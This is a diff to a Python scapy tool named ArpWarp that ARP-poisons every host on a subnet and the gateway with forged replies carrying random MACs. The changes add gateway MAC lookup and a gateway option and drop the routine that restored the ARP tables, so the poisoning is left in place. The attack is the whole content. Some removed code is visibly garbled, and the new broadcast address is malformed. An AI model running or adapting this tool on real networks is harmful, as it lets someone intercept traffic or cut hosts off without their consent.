@@ -33,7 +33,7 @@ banner = """
 class ArpWarp:
     _P_TIMEOUT = 2
 
-    def __init__(self, iface, cidr, s_time, gateway=None):
+    def __init__(self, iface, cidr, s_time, gateway):
         print(f"[*] Setting up attacker...")
 
         self.network_interface = iface
@@ -45,92 +45,31 @@ class ArpWarp:
         self.arp_poison_interval = s_time
 
         self.subnet = self.my_private_ip.split(".")[:3]
-        self.gateway = gateway or f"{'.'.join(self.subnet)}.1"
+        self.gateway_ip = gateway or f"{'.'.join(self.subnet)}.1"
+        self.gateway_mac = self.get_mac(self.gateway_ip)
+        if not self.gateway_mac:
+            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ip}")
 
         self.host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                         host_ip != self.my_private_ip and host_ip != self.gateway}
+                         host_ip != self.my_private_ip and host_ip != self.gateway_ip}
         print(f"[*] Generated {len(self.host_ips)} possible host targets for subnet {'.'.join(self.subnet)}.x")
 
         self.abort = False
-
-    def generate_original_cache(self) -> Dict[str, str]:
-        gateway = self.subnet
-        host_ips =
-        while True:
-            for host_ip in host_ips:
-                arp_packet = ARP(op=2, psrc=ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
-                sendp(Ether() / arp_packet, iface=self.network_interface)
-                print(host_ip)
-            time.sleep(self.arp_poison_interval)
-        exit(0)
-        subnet = ".".join(self.subnet + ["0"])
-        arp_request = ARP(pdst=f"{subnet}/{self.cidr}")
-        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        answered_list = srp(arp_request_broadcast, timeout=2, iface=self.network_interface)[0]
-
-        for _ in range(3):  # perform several scans
-            for element in answered_list:
-                h_ip, h_mac = element[1][ARP].psrc, element[1][ARP].hwsrc
-                if h_ip != self.my_private_ip and h_ip not in arp_cache:
-                    print(f"[+] HOST IS UP {h_ip} -> {h_mac}")
-                    arp_cache[h_ip] = h_mac
-            time.sleep(5)
-
-        print(f"[*] Finished generating original ARP table...")
-        return arp_cache
-
-    def generate_poisoned_cache(self) -> Dict[str, str]:
-        """
-        Generate a new poisoned cache table where each key has the value of the previous key
-        """
-        poisoned_table = dict()
-        table_size = len(self.original_arp_cache)
-        spoofed_values = [list(self.original_arp_cache.values())[i - 1] for i in range(table_size)]
-
-        print(f"[*] Preparing poisoned ARP table...")
-        for index, host_ip in enumerate(self.original_arp_cache.keys()):
-            poisoned_table[host_ip] = spoofed_values[index]
-            print(f"[*] Host {host_ip} original -> {self.original_arp_cache[host_ip]} spoofed -> {poisoned_table[host_ip]}")
-
-        print(f"[*] Poisoned ARP table is ready")
-        return poisoned_table
 
     def poison_arp(self):
         """
         iterate over all spoofed entries, and send each host (inside an inner loop) the
         arp packets of the scrambled entries
         """
-        for host_ip in self.host_ips:  # TODO get mac of gateway
-            arp_packet = ARP(op=2, psrc=host_ip, hwdst="30:24:78:b7:63:7c", hwsrc=RandMAC(), pdst="192.168.1.1")
-            sendp(Ether() / arp_packet, iface=self.network_interface)
-
-    def restore_arp(self):
-        """
-        restore the arp table to the original values for all network hosts
-        """
-        for restore_host_ip, restore_host_mac in self.original_arp_cache.items():
-            print(f"[*] Restoring for {restore_host_ip}...")
-
-            for target_host_ip, target_host_mac in self.original_arp_cache.items():
-                if target_host_ip != restore_host_ip:
-                    self.send_arp_packet(iface=self.network_interface,
-                                         op=2,
-                                         psrc=restore_host_ip,
-                                         hwsrc=restore_host_mac,
-                                         pdst=target_host_ip,
-                                         hwdst=target_host_mac)
+        for host_ip in self.host_ips:
+            # poison gateways's arp cache
+            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ip)
+            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+            # poison host's arp cache
+            arp_packet_host = ARP(op=2, psrc=self.gateway_ip, hwsrc=RandMAC(), pdst=host_ip)
+            sendp(Ether(dst='ff:ff:ff:ff:ff') / arp_packet_host, iface=self.network_interface)
 
     def start_attack(self):
-        print(f"[*] Generating original ARP cache for subnet {'.'.join(self.subnet)}.x, this might a minute...")
-        gateway = self.subnet
-        host_ips = {host_ip for host_ip in ipaddress.IPv4Network(f"{'.'.join(self.subnet)}.0/{self.cidr}") if
-                    host_ip != self.my_private_ip and host_ip != self.gateway}
-        while True:
-
-                print(host_ip)
-            time.sleep(self.arp_poison_interval)
-
         loop_count = 0
         while not self.abort:
             try:
@@ -145,15 +84,14 @@ class ArpWarp:
                 print(f"[*] User requested to stop...")
                 self.abort = True
         print("[*] Restoring arp...")
-        self.restore_arp()
 
     @staticmethod
-    def send_arp_packet(iface, await_res=False, **p_params) -> Union[None, scapy.layers.l2.Ether]:
-        arp_packet = ARP(**p_params)
-        if await_res:
-            arp_res = srp1(Ether() / arp_packet, timeout=ArpWarp._P_TIMEOUT, iface=iface)
-            return arp_res
-        sendp(Ether() / arp_packet, iface=iface)
+    def get_mac(ip_address):
+        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
+                                    timeout=2, retry=10)
+        for s, r in responses:
+            return r[Ether].src
+        return None
 
 
 if __name__ == "__main__":
@@ -171,8 +109,12 @@ if __name__ == "__main__":
     parser.add_argument("-s", "--sleep-interval", dest='s_time', type=int, metavar=(""), default=1,
                         help="set the sleep time between each arp poison attempt (default -> 1[sec])",
                         required=False)
+
+    parser.add_argument("-g", "--set-gateway", dest='gateway', type=str, metavar=(""), default=None,
+                        help="set the gateway ip manually (defaults to x.x.x.1)",
+                        required=False)
     arguments = parser.parse_args()
 
-    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time)
+    warper = ArpWarp(arguments.iface, arguments.mask, arguments.s_time, arguments.gateway)
     warper.start_attack()
 
